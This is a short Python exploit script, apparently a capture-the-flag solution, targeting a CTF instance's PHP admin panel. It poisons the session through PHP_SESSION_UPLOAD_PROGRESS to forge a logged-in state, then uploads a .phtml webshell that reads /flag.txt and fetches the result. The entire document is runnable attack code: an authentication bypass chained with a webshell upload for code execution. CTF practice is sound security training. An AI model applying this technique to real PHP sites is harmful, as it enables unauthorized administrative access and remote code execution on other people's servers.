import requests
import urllib.parse

BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
host = urllib.parse.urlparse(BASE_URL).hostname

sess = requests.Session()
sess.cookies.set("PHPSESSID", "osuadminpwnd", domain=host, path="/")

payload = "|b:1;logged_in|b:1;progress"
shell_body = "<?=file_get_contents('/flag.txt');?>"
files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, payload),
    "file": ("shell.phtml", shell_body, "application/octet-stream"),
}

resp = sess.post(f"{BASE_URL}/admin.php", files=files, allow_redirects=False)
print("Status:", resp.status_code)
print("Headers:", resp.headers)
location = resp.headers.get("Location")
if location:
    if not location.startswith("http"):
        if not location.startswith("/"):
            location = "/" + location
        location = f"{BASE_URL}{location}"
    flag_resp = sess.get(location)
    print("Flag status:", flag_resp.status_code)
    print(flag_resp.text.strip())
else:
    print(resp.text[:500])
